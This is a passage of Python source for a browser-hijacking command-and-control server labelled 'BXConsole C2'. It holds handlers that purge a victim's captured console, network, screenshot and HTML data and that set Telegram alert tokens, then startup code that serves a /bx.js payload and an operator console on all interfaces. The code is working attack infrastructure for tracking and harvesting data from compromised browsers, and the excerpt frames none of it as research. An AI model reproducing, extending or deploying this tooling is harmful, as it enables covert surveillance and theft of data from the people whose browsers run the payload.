                        del CMDS[k]
                    CONSOLE.pop(vid, None)
                    NET.pop(vid, None)
                    PAGEINFO.pop(vid, None)
                    SCREENSHOT.pop(vid, None)
                    HTMLDUMP.pop(vid, None)
                    save_purged()
            evidence({"t": time.strftime("%FT%T"), "tag": "session_purge", "id": vid,
                      "data": {"removed_dirs": removed}})
            self._send(200, "application/json", json.dumps({"ok": True, "removed": removed}).encode())
        elif p == "/api/config":
            try: d = json.loads(raw)
            except Exception: d = {}
            with LOCK:
                for k in ("screenshot", "html", "pageinfo"):
                    if k in d: CONFIG[k] = bool(d[k])
                for k in ("notify_tg_token", "notify_tg_chat"):
                    if k in d: CONFIG[k] = str(d[k])[:200]
            save_config()
            self._send(200, "application/json", b'{"ok":true}')
        elif p == "/api/rename":
            try: d = json.loads(raw)
            except Exception: d = {}
            vid, name = sanitize_vid(d.get("id")), (d.get("name") or "").strip()
            if vid and name:
                with LOCK:
                    NAMES[vid] = name[:40]
                    save_names()
                    save_session_meta(vid)
            self._send(200, "application/json", b'{"ok":true}')
        else:
            self._send(404, "text/plain", b"404")

class S(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True

if __name__ == "__main__":
    os.makedirs(EVID, exist_ok=True)
    os.makedirs(SESSIONS_DIR, exist_ok=True)
    load_names()
    load_config()
    load_sessions()
    threading.Thread(target=_stale_watcher, daemon=True).start()
    sess_count = len(VICTIMS) + len(CLOSED)
    print(f"BXConsole C2 v0.2  :{PORT}  | payload /bx.js | console /bxconsole | sessions: {sess_count} loaded | evidence: {EVID}")
    try:
        S(("0.0.0.0", PORT), Handler).serve_forever()
    except OSError as e:
        print(f"!! 바인드 실패 :{PORT} — {e}. 환경변수 BX_C2_PORT 로 포트를 바꾸세요.")
        sys.exit(1)
